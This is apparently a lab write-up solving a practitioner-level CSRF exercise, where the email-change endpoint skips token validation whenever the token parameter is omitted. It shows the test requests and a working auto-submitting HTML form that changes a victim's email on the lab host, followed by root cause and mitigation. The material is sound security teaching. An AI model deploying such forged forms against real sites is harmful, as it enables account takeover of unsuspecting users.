# Lab: CSRF Where Token Validation Depends on Token Being Present

**Difficulty:** Practitioner  
**Vulnerability:** Cross-Site Request Forgery (CSRF)  
**Status:** Solved ✅

## 1. Lab Overview

This lab contains a CSRF vulnerability in the email change functionality. The application attempts to validate a CSRF token, but the validation mechanism can be bypassed by omitting the token entirely.

**Objective:** Host an HTML page on the Exploit Server that performs a CSRF attack to change the victim's email address.

## 2. Intercepting the Email Change Request

After logging in using the credentials `wiener:peter`, I intercepted the email change request using Burp Suite.

The original request was:

```http
POST /my-account/change-email HTTP/2
Content-Type: application/x-www-form-urlencoded

email=fatih%40sj.com&csrf=jDgBHbyrV3UTuwSSiwSLQiHGXva91zzh
```

The request contained two parameters:

- `email`: The new email address.
- `csrf`: The CSRF token used for request validation.

I wanted to determine whether the application properly enforced CSRF token validation.

## 3. Testing CSRF Token Validation

I performed two tests to compare the server's behavior.

### Test 1: Submitting an Invalid CSRF Token

I replaced the original CSRF token with an invalid value and sent the request.

The server returned:

```http
HTTP/2 400 Bad Request
```

This indicated that the application rejected requests containing an invalid token.

### Test 2: Removing the CSRF Token Entirely

Next, I removed the `csrf` parameter from the request and sent it again.

This time, the server returned:

```http
HTTP/2 302 Found
```

Unlike the previous test, the request was accepted. I then checked my account and confirmed that the email address had actually changed.

**Key finding:** The application rejected an invalid CSRF token but accepted a request with no CSRF token at all. This revealed that token validation was only enforced when the token parameter was present.

## 4. Creating the CSRF Exploit

After confirming the vulnerability, I created an HTML form on the Exploit Server.

My initial attempt used the `GET` method:

```html
<form action="https://0abe00d304caa06a80c3128600ba00c5.web-security-academy.net/my-account/change-email" method="GET">
    <input type="hidden" name="email" value="fateh201152@smail.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

However, this exploit did not work because the endpoint expected a `POST` request for the email change operation.

I corrected the HTTP method to `POST`.

### Final Exploit

```html
<form action="https://0abe00d304caa06a80c3128600ba00c5.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="fateh201152@smail.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

The form submits the email change request automatically when the page loads. Since the form does not include a `csrf` parameter, it takes advantage of the application's failure to enforce token validation when the parameter is absent.

If the victim is authenticated and the browser sends the victim's session cookie with the request, the application may process the email change under the victim's account.

## 5. Delivering the Exploit

I hosted the corrected HTML page on the Exploit Server and delivered it to the victim using the lab's exploit workflow.

The exploit worked, and the lab was successfully completed.

## 6. Root Cause

The root cause is inconsistent CSRF token validation.

The application distinguishes between two cases:

- **Invalid token supplied:** The request is rejected with a `400 Bad Request` response.
- **Token omitted:** The request is accepted, allowing the state-changing operation to proceed.

A CSRF token must not be optional. The server should reject requests that lack a token just as it rejects requests containing an invalid token.

## 7. Key Takeaways

- A CSRF token is ineffective if an attacker can simply omit it.
- An invalid token and a missing token can trigger different server-side behavior.
- HTTP response codes are useful clues, but the actual state change must also be verified.
- The HTML form's HTTP method must match the endpoint's expected behavior.
- Comparing valid, invalid, and missing-token requests is an effective way to investigate CSRF defenses.

### Recommended Mitigation

The application should require a valid CSRF token for every relevant state-changing request. Missing and invalid tokens must both result in rejection. Additional protections, including appropriate `SameSite` cookie settings and origin validation, can provide defense in depth.
